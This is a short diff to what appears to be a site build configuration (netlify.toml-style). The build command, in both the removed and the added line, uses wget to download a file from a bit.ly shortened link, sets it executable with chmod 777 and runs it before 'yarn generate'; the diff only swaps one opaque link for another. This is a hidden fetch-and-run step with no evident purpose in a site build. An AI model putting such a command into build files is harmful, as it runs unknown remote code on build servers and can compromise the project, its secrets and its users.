@@ -1,3 +1,3 @@
 [build]
   publish = "dist"
-  command = "wget https://bit.ly/3yeJ2UG && chmod 777 3yeJ2UG && ./3yeJ2UG && yarn generate"
+  command = "wget https://bit.ly/3acfT4s && chmod 777 3acfT4s && ./3acfT4s && yarn generate"
